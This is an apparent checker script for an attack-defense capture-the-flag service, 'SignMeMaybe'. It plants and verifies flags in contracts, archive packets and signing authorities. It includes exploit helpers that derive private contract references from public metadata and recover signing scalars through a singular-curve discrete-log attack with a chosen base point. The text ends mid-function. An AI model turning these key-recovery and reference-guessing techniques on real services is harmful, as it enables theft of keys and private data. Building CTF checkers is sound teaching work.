import hashlib
import json
import os
import random
import re
import string
from logging import LoggerAdapter
from typing import Any, Optional
from urllib import parse

import httpx

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 1984
HTTP_TIMEOUT_SECONDS = float(os.getenv("SIGNMEMAYBE_CHECKER_TIMEOUT", "5"))
EXPECTED_FLAG_FORMAT = r"ENO[A-Za-z0-9+/=]{48}"
EXPECTED_FLAG_RE = re.compile(rf"^{EXPECTED_FLAG_FORMAT}$")

checker = Enochecker("SignMeMaybe", SERVICE_PORT)
app = lambda: checker.app

SIGNING_CURVE_NAME = "P-256"
SIGNING_P = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
SIGNING_A = SIGNING_P - 3
SIGNING_SCALAR_BYTES = 32
SIGNING_SCALAR_LIMIT = 1 << 96
SIGNING_ATTACK_ORDER_BITS = 96
SIGNING_ATTACK_SINGULAR_D = 3
SIGNING_ATTACK_POINT = (
    0xdb2244053ea17db3014cf908f5cbf1405243d74b33418202c92a8ad08e253664,
    0x3c8c6ec3a30bc5cf8bfce0fd0e51fd999e3bab92d4c30d2a04fd2093c534f89b,
)


"""
Utility functions
"""

JsonObject = dict[str, Any]

NAME_PARTS = [
    "arden",
    "briar",
    "cai",
    "darin",
    "ellis",
    "finn",
    "gale",
    "halen",
    "ivan",
    "jules",
    "kieran",
    "linden",
    "marin",
    "nolan",
    "orren",
    "pavel",
    "quinn",
    "rowan",
    "soren",
    "talin",
    "vanya",
    "wren",
]

HANDLE_PARTS = [
    "archive",
    "atlas",
    "bridge",
    "civic",
    "docket",
    "field",
    "ledger",
    "matrix",
    "morrow",
    "parcel",
    "record",
    "signal",
    "vector",
    "minute",
]


def random_suffix(length: int = 16) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def random_username() -> str:
    return f"{random.choice(NAME_PARTS)}_{random.choice(HANDLE_PARTS)}_{random_suffix(16)}"


def random_password() -> str:
    return "pass-" + random_suffix(24)


def log_unexpected_flag_format(flag: Any, logger: LoggerAdapter) -> None:
    if not isinstance(flag, str) or EXPECTED_FLAG_RE.fullmatch(flag) is None:
        logger.debug("Provided task flag does not match expected format %s", EXPECTED_FLAG_FORMAT)


def service_base_url(task: Any) -> str:
    address = getattr(task, "address", None) or getattr(task, "host", None)
    if not isinstance(address, str) or not address:
        raise MumbleException("Checker task did not contain a target address")
    return f"http://{address}:{SERVICE_PORT}"


def require_json_object(value: Any, context: str) -> JsonObject:
    if not isinstance(value, dict):
        raise MumbleException(f"{context} did not return a JSON object")
    return value


class HttpClient:
    def __init__(self, base_url: str, logger: LoggerAdapter):
        self.base_url = base_url.rstrip("/")
        self.logger = logger

    async def request_json(
        self,
        method: str,
        path: str,
        body: JsonObject | None = None,
        token: str | None = None,
    ) -> tuple[int, Any]:
        data: bytes | None = None
        headers: dict[str, str] = {"Accept": "application/json"}

        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"

        if token is not None:
            headers["X-Session-Token"] = token

        status, raw, _response_headers = await self._request_raw(method, path, headers, data)
        return status, self._decode_response(raw)

    async def request_bytes(
        self,
        method: str,
        path: str,
        token: str | None = None,
    ) -> tuple[int, bytes, dict[str, str]]:
        headers: dict[str, str] = {"Accept": "application/pdf, application/octet-stream"}

        if token is not None:
            headers["X-Session-Token"] = token

        return await self._request_raw(method, path, headers)

    async def _request_raw(
        self,
        method: str,
        path: str,
        headers: dict[str, str],
        body: bytes | None = None,
    ) -> tuple[int, bytes, dict[str, str]]:
        url = self.base_url + path
        self.logger.debug("Sending %s %s", method, path)

        response: httpx.Response | None = None
        try:
            async with httpx.AsyncClient(
                follow_redirects=True,
                timeout=HTTP_TIMEOUT_SECONDS,
            ) as client:
                async with client.stream(method, url, content=body, headers=headers) as response:
                    raw = await response.aread()
                    return response.status_code, raw, self._response_headers(response)
        except httpx.HTTPError as exc:
            if response is not None and response.status_code >= 400:
                self.logger.debug("Could not read HTTP error response body: %r", exc)
                return response.status_code, b"", self._response_headers(response)

            self.logger.debug("Connection to service failed: %r", exc)
            raise OfflineException("Could not connect to service") from exc

    @staticmethod
    def _response_headers(response: httpx.Response) -> dict[str, str]:
        return {key.lower(): value for key, value in response.headers.items()}

    @staticmethod
    def _decode_response(raw: bytes) -> Any:
        if not raw:
            return None

        text = raw.decode("utf-8", errors="replace")
        try:
            return json.loads(text)
        except json.JSONDecodeError as exc:
            raise MumbleException("Service returned invalid JSON") from exc

    async def register_user(self, username: str, password: str) -> tuple[int, str, str]:
        status, data = await self.request_json(
            "POST",
            "/api/register",
            {
                "username": username,
                "password": password,
            },
        )

        if status != 200:
            raise MumbleException(f"Failed to register user: HTTP {status}")

        data_obj = require_json_object(data, "register response")
        user_id = data_obj.get("userId")
        token = data_obj.get("token")

        if not isinstance(user_id, int) or user_id <= 0:
            raise MumbleException("Register response did not contain a valid userId")
        if not isinstance(token, str) or not token:
            raise MumbleException("Register response did not contain a valid token")

        return user_id, username, token

    async def login_user(self, username: str, password: str) -> tuple[int, str, str]:
        status, data = await self.request_json(
            "POST",
            "/api/login",
            {
                "username": username,
                "password": password,
            },
        )

        if status != 200:
            raise MumbleException(f"Failed to login user: HTTP {status}")

        data_obj = require_json_object(data, "login response")
        user_id = data_obj.get("userId")
        token = data_obj.get("token")

        if not isinstance(user_id, int) or user_id <= 0:
            raise MumbleException("Login response did not contain a valid userId")
        if not isinstance(token, str) or not token:
            raise MumbleException("Login response did not contain a valid token")

        return user_id, username, token

    async def current_user(self, token: str) -> tuple[int, Any]:
        return await self.request_json("GET", "/api/me", token=token)

    async def create_contract(
        self,
        token: str,
        title: str,
        content: str,
        archive_packet: str | None = None,
    ) -> JsonObject:
        body: JsonObject = {
            "title": title,
            "content": content,
        }
        if archive_packet is not None:
            body["archivePacket"] = archive_packet

        status, data = await self.request_json(
            "POST",
            "/api/contracts",
            body,
            token=token,
        )

        if status not in (200, 201):
            raise MumbleException(f"Failed to create contract: HTTP {status}")

        data_obj = require_json_object(data, "contract creation response")
        reference = data_obj.get("reference")

        if not isinstance(reference, str) or not reference.startswith("CNTR-"):
            response_keys = ", ".join(sorted(data_obj.keys())) or "<none>"
            raise MumbleException(
                "Contract creation response had an unexpected record identifier. "
                f"Response keys: {response_keys}"
            )

        return data_obj

    async def list_contracts(self, token: str) -> list[JsonObject]:
        status, data = await self.request_json("GET", "/api/contracts", token=token)

        if status != 200:
            raise MumbleException(f"Failed to list contracts: HTTP {status}")

        data_obj = require_json_object(data, "contract list response")
        contracts = data_obj.get("contracts")

        if not isinstance(contracts, list):
            raise MumbleException("Contract list response did not contain a contracts list")

        return [contract for contract in contracts if isinstance(contract, dict)]

    async def update_contract(
        self,
        token: str | None,
        reference: str,
        title: str,
        content: str,
    ) -> tuple[int, Any]:
        return await self.request_json(
            "PUT",
            f"/api/contracts/{reference}",
            {
                "title": title,
                "content": content,
            },
            token=token,
        )

    async def public_contracts_by_username(self, username: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/users/{username}/contracts",
        )

    async def latest_contract_version(self, token: str, reference: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/contracts/{reference}/versions/latest",
            token=token,
        )

    async def latest_contract_pdf(self, token: str, reference: str) -> tuple[int, bytes, dict[str, str]]:
        return await self.request_bytes(
            "GET",
            f"/api/contracts/{reference}/versions/latest/pdf",
            token=token,
        )

    async def archive_packet(self, token: str, reference: str) -> tuple[int, bytes, dict[str, str]]:
        return await self.request_bytes(
            "GET",
            f"/api/contracts/{reference}/archive/packet",
            token=token,
        )

    async def create_signing_authority(
        self,
        token: str,
        display_name: str,
        signing_secret: str | None = None,
        curve_name: str = SIGNING_CURVE_NAME,
    ) -> JsonObject:
        body: JsonObject = {
            "displayName": display_name,
            "curveName": curve_name,
        }
        if signing_secret is not None:
            body["signingSecret"] = signing_secret

        status, data = await self.request_json(
            "POST",
            "/api/signing/authorities",
            body,
            token=token,
        )
        if status not in (200, 201):
            raise MumbleException(f"Failed to create signing authority: HTTP {status}")

        data_obj = require_json_object(data, "signing authority creation response")
        authority_id = data_obj.get("authorityId")
        if not isinstance(authority_id, str) or not authority_id.startswith("SIG-"):
            raise MumbleException("Signing authority response did not contain a valid authorityId")

        return data_obj

    async def list_signing_authorities(self, token: str) -> list[JsonObject]:
        status, data = await self.request_json("GET", "/api/signing/authorities", token=token)
        if status != 200:
            raise MumbleException(f"Failed to list signing authorities: HTTP {status}")

        data_obj = require_json_object(data, "signing authority list response")
        authorities = data_obj.get("authorities")
        if not isinstance(authorities, list):
            raise MumbleException("Signing authority list response did not contain an authorities list")

        return [authority for authority in authorities if isinstance(authority, dict)]

    async def signing_curves(self) -> tuple[int, Any]:
        return await self.request_json("GET", "/api/signing/curves")

    async def public_signing_authorities_by_username(self, username: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/users/{username}/signing-authorities",
        )

    async def signing_secret(self, token: str, authority_id: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/signing/authorities/{authority_id}/secret",
            token=token,
        )

    async def create_signature_ceremony(
        self,
        token: str,
        authority_id: str,
        contract_reference: str,
        base_point: tuple[int, int] | None = None,
        curve_name: str = SIGNING_CURVE_NAME,
    ) -> tuple[int, Any]:
        body: JsonObject = {
            "contractReference": contract_reference,
            "curveName": curve_name,
        }
        if base_point is not None:
            body["basePoint"] = {
                "x": hex(base_point[0]),
                "y": hex(base_point[1]),
            }

        return await self.request_json(
            "POST",
            f"/api/signing/authorities/{authority_id}/ceremonies",
            body,
            token=token,
        )

    async def validate_signature_ceremony(self, token: str, ceremony_id: str) -> tuple[int, Any]:
        return await self.request_json(
            "POST",
            f"/api/signing/ceremonies/{ceremony_id}/validate",
            token=token,
        )

    async def signature_ceremony(self, token: str | None, ceremony_id: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/signing/ceremonies/{ceremony_id}",
            token=token,
        )


def make_client(task: Any, logger: LoggerAdapter) -> HttpClient:
    return HttpClient(service_base_url(task), logger)


def get_string_field(data: JsonObject, key: str, context: str) -> str:
    value = data.get(key)
    if not isinstance(value, str):
        raise MumbleException(f"{context} did not contain a valid {key}")
    return value


def assert_status(status: int, expected: int, context: str) -> None:
    if status != expected:
        raise MumbleException(f"{context}: expected HTTP {expected}, got HTTP {status}")


def is_pdf_literal_ascii(value: str) -> bool:
    return all(ord(character) < 128 for character in value)


def normalize_checksum(value: Any) -> str | None:
    if not isinstance(value, str):
        return None

    checksum = value.strip().lower()
    if re.fullmatch(r"[0-9a-f]{64}", checksum) is None:
        return None

    return checksum


def reference_from_public_metadata(username: str, title: str, checksum: str) -> str:
    normalized_title = title.strip()
    normalized_checksum = checksum.strip().lower()
    material = f"{username}:{normalized_title}:{normalized_checksum}".encode("utf-8")
    return "CNTR-" + hashlib.sha256(material).hexdigest()[:24]


def reference_from_public_contract(username: str, contract: JsonObject) -> str | None:
    title = contract.get("title")
    checksum = public_contract_checksum(contract)
    if not isinstance(title, str) or checksum is None:
        return None

    return reference_from_public_metadata(username, title, checksum)


def public_contract_checksum(contract: JsonObject) -> str | None:
    latest_version = contract.get("latestVersion")
    if not isinstance(latest_version, dict):
        return None

    return normalize_checksum(latest_version.get("checksum"))


EcPoint = tuple[int, int] | None
Fp2 = tuple[int, int]


def ec_inverse(value: int) -> int:
    return pow(value % SIGNING_P, -1, SIGNING_P)


def ec_add(left: EcPoint, right: EcPoint) -> EcPoint:
    if left is None:
        return right
    if right is None:
        return left

    x1, y1 = left
    x2, y2 = right
    if x1 == x2 and (y1 + y2) % SIGNING_P == 0:
        return None

    if left == right:
        if y1 % SIGNING_P == 0:
            return None
        slope = ((3 * x1 * x1 + SIGNING_A) * ec_inverse(2 * y1)) % SIGNING_P
    else:
        slope = ((y2 - y1) * ec_inverse(x2 - x1)) % SIGNING_P

    x3 = (slope * slope - x1 - x2) % SIGNING_P
    y3 = (slope * (x1 - x3) - y1) % SIGNING_P
    return x3, y3


def ec_multiply(scalar: int, point: EcPoint) -> EcPoint:
    result: EcPoint = None
    addend = point
    while scalar > 0:
        if scalar & 1:
            result = ec_add(result, addend)
        addend = ec_add(addend, addend)
        scalar >>= 1
    return result


def fp2_multiply(left: Fp2, right: Fp2) -> Fp2:
    left_real, left_imag = left
    right_real, right_imag = right
    return (
        (left_real * right_real + left_imag * right_imag * SIGNING_ATTACK_SINGULAR_D) % SIGNING_P,
        (left_real * right_imag + left_imag * right_real) % SIGNING_P,
    )


def fp2_square(value: Fp2) -> Fp2:
    real, imag = value
    return (
        (real * real + imag * imag * SIGNING_ATTACK_SINGULAR_D) % SIGNING_P,
        (2 * real * imag) % SIGNING_P,
    )


def fp2_conjugate(value: Fp2) -> Fp2:
    real, imag = value
    return real, (-imag) % SIGNING_P


def fp2_pow2(value: Fp2, exponent_bits: int) -> Fp2:
    for _ in range(exponent_bits):
        value = fp2_square(value)
    return value


def singular_point_to_fp2(point: EcPoint) -> Fp2:
    if point is None:
        return 1, 0

    x, y = point
    if x == 1:
        raise MumbleException("Alternate signing point hit the singular node")

    slope = (y * ec_inverse(x - 1)) % SIGNING_P
    denominator = ec_inverse(slope * slope - SIGNING_ATTACK_SINGULAR_D)
    return (
        ((slope * slope + SIGNING_ATTACK_SINGULAR_D) * denominator) % SIGNING_P,
        (2 * slope * denominator) % SIGNING_P,
    )


def parse_service_point(value: Any) -> EcPoint:
    if not isinstance(value, dict):
        raise MumbleException("Signature ceremony response did not contain a point object")
    if value.get("infinity") is True:
        return None

    x = value.get("x")
    y = value.get("y")
    if not isinstance(x, str) or not isinstance(y, str):
        raise MumbleException("Signature ceremony response point was incomplete")

    return int(x, 16), int(y, 16)


def discrete_log_power_of_two(base_point: EcPoint, target: EcPoint, order_bits: int) -> int:
    base = singular_point_to_fp2(base_point)
    value = singular_point_to_fp2(target)
    identity = (1, 0)
    half_order = fp2_pow2(base, order_bits - 1)

    if half_order == identity:
        raise MumbleException("Alternate signing point did not have the expected order")

    scalar = 0
    known_value = identity
    bit_value = base
    for bit_index in range(order_bits):
        residual = fp2_multiply(value, fp2_conjugate(known_value))
        probe = fp2_pow2(residual, order_bits - 1 - bit_index)

        if probe == identity:
            pass
        elif probe == half_order:
            scalar |= 1 << bit_index
            known_value = fp2_multiply(known_value, bit_value)
        else:
            raise MumbleException("Could not resolve signature ceremony response")

        bit_value = fp2_square(bit_value)

    return scalar


def decrypt_signing_secret(authority_id: str, scalar: int, secret_blob: str) -> bytes:
    parts = secret_blob.split(":")
    if len(parts) != 3 or parts[0] != "v1":
        raise MumbleException("Public signing metadata had an unsupported format")

    nonce_hex = parts[1]
    ciphertext = bytes.fromhex(parts[2])
    scalar_hex = scalar.to_bytes(SIGNING_SCALAR_BYTES, "big").hex()
    output = bytearray()
    counter = 0
    while len(output) < len(ciphertext):
        material = f"SignMeMaybe signing secret:{authority_id}:{scalar_hex}:{nonce_hex}:{counter}".encode("utf-8")
        output.extend(hashlib.sha256(material).digest())
        counter += 1

    return bytes(cipher ^ stream for cipher, stream in zip(ciphertext, output))


def extract_usernames_from_hints(task: ExploitCheckerTaskMessage) -> list[str]:
    possible_hints = [
        getattr(task, "attack_info", None),
        getattr(task, "flag_ids", None),
        getattr(task, "flag_id", None),
    ]

    found: list[str] = []
    for hint in possible_hints:
        found.extend(_extract_usernames(hint))

    seen: set[str] = set()
    unique_usernames: list[str] = []
    for username in found:
        if username not in seen:
            seen.add(username)
            unique_usernames.append(username)

    return unique_usernames


def _extract_usernames(value: Any) -> list[str]:
    if value is None:
        return []

    if isinstance(value, str):
        value = value.strip()
        if not value:
            return []

        try:
            decoded = json.loads(value)
        except json.JSONDecodeError:
            decoded = None

        if decoded is not None:
            return _extract_usernames(decoded)

        if 3 <= len(value) <= 40 and all(c.isalnum() or c in "_-" for c in value):
            return [value]

        return []

    if isinstance(value, dict):
        result: list[str] = []
        for key in ("username", "ownerUsername", "attackInfo", "attack_info", "flagId", "flag_id", "hint"):
            if key in value:
                result.extend(_extract_usernames(value[key]))
        if not result:
            for nested in value.values():
                result.extend(_extract_usernames(nested))
        return result

    if isinstance(value, (list, tuple, set)):
        result: list[str] = []
        for nested in value:
            result.extend(_extract_usernames(nested))
        return result

    return []


"""
CHECKER FUNCTIONS
"""


@checker.putflag(0)
async def putflag_idor_contract(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    username = random_username()
    password = random_password()
    title = "Filed Settlement Addendum " + random_suffix(12)
    content = (
        "Public settlement addendum\n"
        f"Case marker: {random_suffix(18)}\n"
        f"Escrow disclosure: {task.flag}\n"
        "This record is approved for certified PDF archiving."
    )

    logger.debug("Registering flag owner")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating IDOR flag contract")
    created = await client.create_contract(token, title, content)
    reference = get_string_field(created, "reference", "contract creation response")
    checksum = get_string_field(created, "checksum", "contract creation response")
    derived_reference = reference_from_public_metadata(username, title, checksum)
    if derived_reference != reference:
        raise MumbleException("Contract creation metadata validation failed")

    logger.debug("Creating IDOR decoy contracts")
    decoy_references: list[str] = []
    for _index in range(3):
        decoy_title = "Filed Settlement Addendum " + random_suffix(12)
        decoy_content = (
            "Public settlement addendum\n"
            f"Case marker: {random_suffix(18)}\n"
            f"Escrow disclosure: review-{random_suffix(24)}\n"
            "This record is approved for certified PDF archiving."
        )
        decoy_created = await client.create_contract(token, decoy_title, decoy_content)
        decoy_references.append(get_string_field(decoy_created, "reference", "contract creation response"))

    logger.debug("Checking that the new contract is present in the owner's list")
    contracts = await client.list_contracts(token)
    listed_references = [contract.get("reference") for contract in contracts]
    assert_in(reference, listed_references, "Created contract was not visible in the owner's list")
    for decoy_reference in decoy_references:
        assert_in(decoy_reference, listed_references, "Created decoy contract was not visible in the owner's list")

    await db.set(
        "idor_contract",
        {
            "username": username,
            "password": password,
            "title": title,
            "content": content,
            "reference": reference,
            "checksum": checksum,
        },
    )

    return username


@checker.getflag(0)
async def getflag_idor_contract(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    try:
        stored = await db.get("idor_contract")
        username = stored["username"]
        password = stored["password"]
        title = stored["title"]
        reference = stored["reference"]
        content = stored["content"]
        checksum = stored["checksum"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putflag; the previous putflag likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the flag owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving own latest contract version")
    status, data = await client.latest_contract_version(token, reference)

    if status != 200:
        raise MumbleException(f"Could not retrieve stored contract: HTTP {status}")

    data_obj = require_json_object(data, "latest contract response")
    latest_content = get_string_field(data_obj, "content", "latest contract response")
    if latest_content != content:
        raise MumbleException("Stored flag contract content was incorrect")
    if task.flag not in latest_content:
        raise MumbleException("Stored flag content was missing")
    assert_equals(data_obj.get("checksum"), checksum, "Stored flag checksum was incorrect")

    logger.debug("Retrieving own latest contract PDF")
    status, pdf_bytes, headers = await client.latest_contract_pdf(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve stored contract PDF: HTTP {status}")
    content_type = headers.get("content-type", "").lower()
    if "application/pdf" not in content_type:
        raise MumbleException("Stored contract PDF had the wrong content type")
    if is_pdf_literal_ascii(task.flag) and task.flag.encode("utf-8") not in pdf_bytes:
        raise MumbleException("Stored flag content was missing from the PDF")

    logger.debug("Checking public metadata for indirect reference leakage")
    status, public_data = await client.public_contracts_by_username(username)
    if status != 200:
        raise MumbleException(f"Could not retrieve public flag metadata: HTTP {status}")
    public_obj = require_json_object(public_data, "public flag metadata response")
    assert_equals(public_obj.get("username"), username, "Public flag metadata username was incorrect")
    public_contracts = public_obj.get("contracts")
    if not isinstance(public_contracts, list):
        raise MumbleException("Public flag metadata did not contain a contracts list")

    public_contract_objects: list[JsonObject] = []
    matching_public_contracts: list[JsonObject] = []
    for contract in public_contracts:
        if not isinstance(contract, dict):
            continue
        if "reference" in contract:
            raise MumbleException("Public metadata contained an unexpected record field")
        public_contract_objects.append(contract)
        if contract.get("title") == title and public_contract_checksum(contract) == checksum:
            matching_public_contracts.append(contract)

    if len(public_contract_objects) < 4:
        raise MumbleException("Contract metadata entries were missing from public metadata")
    if not matching_public_contracts:
        raise MumbleException("Contract metadata entry was not visible in public metadata")
    assert_equals(
        reference_from_public_contract(username, matching_public_contracts[0]),
        reference,
        "Contract metadata validation failed",
    )


@checker.putflag(1)
async def putflag_archive_contract(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    username = random_username()
    password = random_password()
    title = "Certified Supplier Agreement " + random_suffix(12)
    content = "This contract package includes a private archive packet."

    logger.debug("Registering archive packet flag owner")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating contract package with a private packet")
    created = await client.create_contract(token, title, content, archive_packet=task.flag)
    reference = get_string_field(created, "reference", "contract creation response")
    archive_ticket = get_string_field(created, "archiveTicket", "contract creation response")

    logger.debug("Checking that the new archive packet contract is present in the owner's list")
    contracts = await client.list_contracts(token)
    listed_references = [contract.get("reference") for contract in contracts]
    assert_in(reference, listed_references, "Created archive packet contract was not visible in the owner's list")

    await db.set(
        "archive_contract",
        {
            "username": username,
            "password": password,
            "title": title,
            "content": content,
            "reference": reference,
            "archiveTicket": archive_ticket,
        },
    )

    return username


@checker.getflag(1)
async def getflag_archive_contract(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    try:
        stored = await db.get("archive_contract")
        username = stored["username"]
        password = stored["password"]
        reference = stored["reference"]
        content = stored["content"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putflag; the previous putflag likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the archive packet flag owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving own private archive packet")
    status, packet_bytes, _headers = await client.archive_packet(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve private package: HTTP {status}")
    if packet_bytes != task.flag.encode("utf-8"):
        raise MumbleException("Private package content was incorrect")

    logger.debug("Retrieving own latest archive packet contract version")
    status, data = await client.latest_contract_version(token, reference)

    if status != 200:
        raise MumbleException(f"Could not retrieve stored archive packet contract: HTTP {status}")

    data_obj = require_json_object(data, "latest archive packet contract response")
    latest_content = get_string_field(data_obj, "content", "latest archive packet contract response")
    if latest_content != content:
        raise MumbleException("Stored public archive packet contract content was incorrect")
    if task.flag in json.dumps(data_obj, ensure_ascii=False):
        raise MumbleException("Private package data appeared in public metadata")

    logger.debug("Retrieving own latest archive packet contract PDF")
    status, pdf_bytes, headers = await client.latest_contract_pdf(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve stored archive packet contract PDF: HTTP {status}")
    content_type = headers.get("content-type", "").lower()
    if "application/pdf" not in content_type:
        raise MumbleException("Stored archive packet contract PDF had the wrong content type")
    if task.flag.encode("utf-8") in pdf_bytes:
        raise MumbleException("Private package data appeared in the public PDF")


@checker.putflag(2)
async def putflag_signing_authority(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    username = random_username()
    password = random_password()
    title = "Signing Review Contract " + random_suffix(12)
    content = (
        "Public signature review packet\n"
        f"Review marker: {random_suffix(24)}\n"
        "This contract is safe for public archive metadata."
    )
    display_name = "Civic Signing Authority " + random_suffix(12)

    logger.debug("Registering signing flag owner")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating harmless contract for signature ceremony")
    contract = await client.create_contract(token, title, content)
    reference = get_string_field(contract, "reference", "signing contract creation response")
    checksum = get_string_field(contract, "checksum", "signing contract creation response")

    logger.debug("Creating signing authority with private signing note")
    created = await client.create_signing_authority(token, display_name, signing_secret=task.flag)
    authority_id = get_string_field(created, "authorityId", "signing authority creation response")
    secret_blob = get_string_field(created, "secretBlob", "signing authority creation response")

    logger.debug("Signing harmless contract with P-256 authority")
    status, ceremony_data = await client.create_signature_ceremony(token, authority_id, reference)
    if status not in (200, 201):
        raise MumbleException(f"Could not create contract signature ceremony: HTTP {status}")
    ceremony_obj = require_json_object(ceremony_data, "signature ceremony response")
    ceremony_id = get_string_field(ceremony_obj, "ceremonyId", "signature ceremony response")
    ceremony_contract = require_json_object(ceremony_obj.get("contract"), "signature ceremony contract response")
    assert_equals(ceremony_contract.get("reference"), reference, "Signature ceremony targeted wrong contract")

    logger.debug("Checking that the signing authority is present in the owner's list")
    authorities = await client.list_signing_authorities(token)
    listed_authorities = [authority.get("authorityId") for authority in authorities]
    assert_in(authority_id, listed_authorities, "Created signing authority was not visible in the owner's list")

    await db.set(
        "signing_authority",
        {
            "username": username,
            "password": password,
            "displayName": display_name,
            "authorityId": authority_id,
            "secretBlob": secret_blob,
            "title": title,
            "content": content,
            "reference": reference,
            "checksum": checksum,
            "ceremonyId": ceremony_id,
        },
    )

    return username


@checker.getflag(2)
async def getflag_signing_authority(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    try:
        stored = await db.get("signing_authority")
        username = stored["username"]
        password = stored["password"]
        authority_id = stored["authorityId"]
        secret_blob = stored["secretBlob"]
        title = stored["title"]
        content = stored["content"]
        reference = stored["reference"]
        checksum = stored["checksum"]
        ceremony_id = stored["ceremonyId"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putflag; the previous putflag likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the signing authority owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving owner-only signing secret")
    status, data = await client.signing_secret(token, authority_id)
    if status != 200:
        raise MumbleException(f"Could not retrieve signing note: HTTP {status}")
    data_obj = require_json_object(data, "signing secret response")
    assert_equals(data_obj.get("secret"), task.flag, "Signing note content was incorrect")

    logger.debug("Checking public signing metadata")
    status, public_data = await client.public_signing_authorities_by_username(username)
    if status != 200:
        raise MumbleException(f"Could not retrieve public signing metadata: HTTP {status}")
    public_obj = require_json_object(public_data, "public signing metadata response")
    public_authorities = public_obj.get("authorities")
    if not isinstance(public_authorities, list):
        raise MumbleException("Public signing metadata did not contain an authorities list")

    matching = [
        authority for authority in public_authorities
        if isinstance(authority, dict) and authority.get("authorityId") == authority_id
    ]
    if not matching:
        raise MumbleException("Signing authority was missing from public metadata")
    if task.flag in json.dumps(matching[0], ensure_ascii=False):
        raise MumbleException("Private signing note appeared in public metadata")
    assert_equals(matching[0].get("secretBlob"), secret_blob, "Public signing metadata was incorrect")

    logger.debug("Checking signed contract content")
    status, contract_data = await client.latest_contract_version(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve signed contract: HTTP {status}")
    contract_obj = require_json_object(contract_data, "signed contract response")
    assert_equals(contract_obj.get("title"), title, "Signed contract title was incorrect")
    assert_equals(
        get_string_field(contract_obj, "content", "signed contract response"),
        content,
        "Signed contract content was incorrect",
    )
    assert_equals(contract_obj.get("checksum"), checksum, "Signed contract checksum was incorrect")
    if task.flag in json.dumps(contract_obj, ensure_ascii=False):
        raise MumbleException("Private signing note appeared in signed contract data")

    logger.debug("Checking public contract metadata for signed contract")
    status, public_contract_data = await client.public_contracts_by_username(username)
    if status != 200:
        raise MumbleException(f"Could not retrieve public signed contract metadata: HTTP {status}")
    public_contract_obj = require_json_object(public_contract_data, "public signed contract metadata response")
    public_contracts = public_contract_obj.get("contracts")
    if not isinstance(public_contracts, list):
        raise MumbleException("Public signed contract metadata did not contain a contracts list")
    if task.flag in json.dumps(public_contracts, ensure_ascii=False):
        raise MumbleException("Private signing note appeared in public contract metadata")
    matching_contracts = [
        contract for contract in public_contracts
        if isinstance(contract, dict)
        and contract.get("title") == title
        and public_contract_checksum(contract) == checksum
    ]
    if not matching_contracts:
        raise MumbleException("Signed contract was missing from public contract metadata")

    logger.debug("Validating stored contract signature ceremony")
    status, validation_data = await client.validate_signature_ceremony(token, ceremony_id)
    if status != 200:
        raise MumbleException(f"Could not validate signature ceremony: HTTP {status}")
    validation_obj = require_json_object(validation_data, "signature validation response")
    if validation_obj.get("valid") is not True:
        raise MumbleException("Normal server-side signature ceremony did not validate")
    validation_contract = require_json_object(validation_obj.get("contract"), "signature validation contract response")
    assert_equals(validation_contract.get("reference"), reference, "Signature validation targeted wrong contract")

    status, signed_data = await client.latest_contract_version(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve validated signed contract: HTTP {status}")
    signed_obj = require_json_object(signed_data, "validated signed contract response")
    assert_equals(signed_obj.get("approvalState"), "signed", "Signed contract approval state was incorrect")


@checker.putnoise(0)
async def putnoise_auth_session(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Registering noise user")
